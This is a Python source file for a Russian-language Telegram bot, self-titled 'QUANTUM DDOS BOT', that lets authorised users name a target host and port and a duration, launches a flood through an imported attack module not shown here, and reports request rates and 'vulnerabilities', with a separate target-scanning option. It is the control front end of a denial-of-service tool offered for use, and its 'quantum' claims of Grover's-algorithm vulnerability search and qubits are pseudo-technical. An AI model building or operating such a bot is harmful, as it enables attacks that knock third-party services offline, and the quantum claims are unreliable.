#!/usr/bin/env python3
import os
import sys
import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
from quantum_engine import QuantumAttackSimulator

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ Ошибка: BOT_TOKEN не установлен!")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()

bot = telebot.TeleBot(BOT_TOKEN)
simulator = QuantumAttackSimulator()

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

# ========== КЛАВИАТУРЫ ==========
def main_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("⚛️ КВАНТОВАЯ АТАКА", callback_data="quantum"),
        InlineKeyboardButton("🔍 АНАЛИЗ ЦЕЛИ", callback_data="analyze"),
        InlineKeyboardButton("📊 СТАТУС", callback_data="status"),
        InlineKeyboardButton("👑 АДМИН", callback_data="admin")
    )
    return kb

# ========== ОБРАБОТЧИКИ ==========
@bot.message_handler(commands=['start'])
def start_cmd(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ ДОСТУП ЗАПРЕЩЕН")
        return
    
    welcome = (
        "⚛️ **QUANTUM DDOS BOT** ⚛️\n\n"
        "Квантовый движок для оптимизации DDoS-атак\n"
        "с использованием симулированных квантовых алгоритмов.\n\n"
        "**Возможности:**\n"
        "• Квантовая суперпозиция параметров\n"
        "• Алгоритм Гровера для поиска уязвимостей\n"
        "• Квантовое шифрование команд\n"
        "• Оптимизация методом квантового отжига\n\n"
        "Выбери режим:"
    )
    bot.send_message(m.chat.id, welcome, parse_mode='Markdown', reply_markup=main_keyboard())

@bot.callback_query_handler(func=lambda c: True)
def callback_handler(c):
    uid = c.from_user.id
    cid = c.message.chat.id
    mid = c.message.id
    data = c.data
    
    if not is_auth(uid):
        bot.answer_callback_query(c.id, "❌ Доступ запрещен")
        return
    
    if data == "quantum":
        msg = bot.edit_message_text(
            "⚛️ **КВАНТОВАЯ АТАКА**\n\n"
            "Введи цель в формате: `ip:порт`\n"
            "Например: `example.com:80`",
            cid, mid, parse_mode='Markdown'
        )
        bot.register_next_step_handler_by_chat_id(cid, process_quantum_target)
    
    elif data == "analyze":
        msg = bot.edit_message_text(
            "🔍 **КВАНТОВЫЙ АНАЛИЗ**\n\n"
            "Введи цель для сканирования уязвимостей:",
            cid, mid, parse_mode='Markdown'
        )
        bot.register_next_step_handler_by_chat_id(cid, process_analyze)
    
    elif data == "status":
        bot.edit_message_text(
            "📊 **СТАТУС**\n\n"
            "⚛️ Квантовый движок: ONLINE\n"
            "🧬 Кубитов: 20\n"
            "⚡ Состояние: ГОТОВ",
            cid, mid, parse_mode='Markdown'
        )

def process_quantum_target(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        target_input = m.text.strip()
        if ':' not in target_input:
            target_input += ':80'
        
        target, port = target_input.rsplit(':', 1)
        port = int(port)
        
        msg = bot.send_message(
            m.chat.id,
            f"🎯 Цель: {target}:{port}\n"
            f"⏱ Введи длительность (сек, 10-300):"
        )
        bot.register_next_step_handler(msg, process_quantum_duration, target, port)
    except:
        bot.send_message(m.chat.id, "❌ Неверный формат")

def process_quantum_duration(m, target, port):
    if not is_auth(m.from_user.id):
        return
    
    try:
        duration = int(m.text.strip())
        if duration < 10 or duration > 300:
            duration = 60
        
        bot.send_message(
            m.chat.id,
            f"⚛️ **ЗАПУСК КВАНТОВОЙ АТАКИ**\n\n"
            f"🎯 Цель: {target}:{port}\n"
            f"⏱ Длительность: {duration} сек\n\n"
            f"🧬 Выполняется квантовая оптимизация..."
        )
        
        def run_quantum():
            result = simulator.quantum_attack(target, port, duration)
            
            report = (
                f"✅ **КВАНТОВАЯ АТАКА ЗАВЕРШЕНА**\n\n"
                f"📊 **Результаты:**\n"
                f"• Запросов: {result['requests']}\n"
                f"• RPS: {result['rps']:.0f}\n"
                f"• Метод: {result['params'].method}\n"
                f"• Потоки: {result['params'].threads}\n"
                f"• Амплификация: x{result['params'].amplitude}\n\n"
                f"🔍 **Найденные уязвимости:**\n"
            )
            
            for v in result['vulnerabilities']:
                report += f"• {v['type']} (уверенность: {v['confidence']:.1%})\n"
            
            bot.send_message(m.chat.id, report, parse_mode='Markdown')
        
        threading.Thread(target=run_quantum).start()
        
    except:
        bot.send_message(m.chat.id, "❌ Ошибка")

def process_analyze(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        target_input = m.text.strip()
        if ':' not in target_input:
            target_input += ':80'
        
        target, port = target_input.rsplit(':', 1)
        port = int(port)
        
        bot.send_message(m.chat.id, f"🔍 **КВАНТОВЫЙ АНАЛИЗ** {target}:{port}")
        
        # Создаём сканер
        from quantum_engine import QuantumVulnerabilityScanner
        scanner = QuantumVulnerabilityScanner({'ip': target, 'port': port})
        vulns = scanner.scan()
        
        report = "🔍 **РЕЗУЛЬТАТЫ АНАЛИЗА**\n\n"
        for v in vulns:
            report += f"• {v['type']} (уверенность: {v['confidence']:.1%})\n"
        
        bot.send_message(m.chat.id, report, parse_mode='Markdown')
        
    except:
        bot.send_message(m.chat.id, "❌ Ошибка анализа")

if __name__ == '__main__':
    print("⚛️ QUANTUM BOT ЗАПУЩЕН")
    print(f"🤖 Бот: @{bot.get_me().username}")
    bot.infinity_polling()
